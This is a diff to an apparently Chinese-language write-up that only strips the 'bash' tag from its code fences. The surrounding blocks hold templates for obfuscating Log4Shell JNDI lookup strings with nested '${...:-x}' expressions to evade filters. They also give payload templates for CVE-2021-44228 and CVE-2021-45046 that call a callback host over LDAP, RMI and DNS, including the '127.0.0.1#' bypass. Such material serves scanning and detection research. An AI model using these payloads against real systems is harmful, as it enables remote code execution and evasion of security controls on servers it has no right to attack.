@@ -30,7 +30,7 @@ tags:
 
 下面是初级混淆的模板：
 
-```bash
+```
 # Primary Obfuscated Colon Template
 :
 ${::-:}
@@ -54,7 +54,7 @@ ${:-:}
 ${{{random_lookup}}:{{random_variable}}:-:}
 ```
 
-```bash
+```
 # Primary Obfuscated Lowercase Template
 {{lowercase}}
 ${::-{{lowercase}}}
@@ -78,7 +78,7 @@ ${:-{{lowercase}}}
 ${{{random_lookup}}:{{random_variable}}:-{{lowercase}}}
 ```
 
-```bash
+```
 # Primary Obfuscated Uppercase Template
 {{uppercase}}
 ${::-{{uppercase}}}
@@ -106,7 +106,7 @@ ${{{random_lookup}}:{{random_variable}}:-{{uppercase}}}
 
 下面是二次混淆的模板：
 
-```bash
+```
 # Secondary Obfuscated Colon Template
 :
 ${::-:}
@@ -130,7 +130,7 @@ ${:-:}
 ${{{random_lookup}}:{{random_variable}}:-:}
 ```
 
-```bash
+```
 # Unprefixed Lookup template that replaces the Lookup prefix
 ${{{random_lookup}}:{{random_variable}}:-{{uppercase}}}
 ${{{random_lookup}}:{{random_variable}}:-{{lowercase}}}
@@ -144,7 +144,7 @@ ${::-{{lowercase}}}
 
 模板中占位符的作用是对可用的Lookups的前缀利用无前缀的Lookups进行等效替换。
 
-```bash
+```
 # Secondary Obfuscated Lowercase Template
 {{lowercase}}
 ${::-{{lowercase}}}
@@ -168,7 +168,7 @@ ${:-{{lowercase}}}
 ${{{random_lookup}}:{{random_variable}}:-{{lowercase}}}
 ```
 
-```bash
+```
 # Secondary Obfuscated Uppercase Template
 {{uppercase}}
 ${::-{{uppercase}}}
@@ -194,7 +194,7 @@ ${{{random_lookup}}:{{random_variable}}:-{{uppercase}}}
 
 下面是CVE-2021-44228和CVE-2021-45046 payloads的模板：
 
-```bash
+```
 # CVE-2021-44228 payloads template
 ${{{j_lookup}}{{n_lookup}}{{d_lookup}}{{i_lookup}}{{colon}}{{l_proto}}{{d_proto}}{{a_proto}}{{p_proto}}{{colon}}//{{callback_host}}/{{random}}}
 ${{{j_lookup}}{{n_lookup}}{{d_lookup}}{{i_lookup}}{{colon}}{{l_proto}}{{d_proto}}{{a_proto}}{{p_proto}}{{colon}}//{{callback_host}}}
@@ -202,7 +202,7 @@ ${{{j_lookup}}{{n_lookup}}{{d_lookup}}{{i_lookup}}{{colon}}{{r_proto}}{{m_proto}
 ${{{j_lookup}}{{n_lookup}}{{d_lookup}}{{i_lookup}}{{colon}}{{d_proto}}{{n_proto}}{{s_proto}}{{colon}}//{{callback_host}}/{{random}}}
 ```
 
-```bash
+```
 # CVE-2021-45046 payloads template
 ${{{j_lookup}}{{n_lookup}}{{d_lookup}}{{i_lookup}}{{colon}}{{l_proto}}{{d_proto}}{{a_proto}}{{p_proto}}{{colon}}//127.0.0.1#{{callback_host}}:1389/{{random}}}
 ${{{j_lookup}}{{n_lookup}}{{d_lookup}}{{i_lookup}}{{colon}}{{l_proto}}{{d_proto}}{{a_proto}}{{p_proto}}{{colon}}//127.0.0.1#{{callback_host}}/{{random}}}
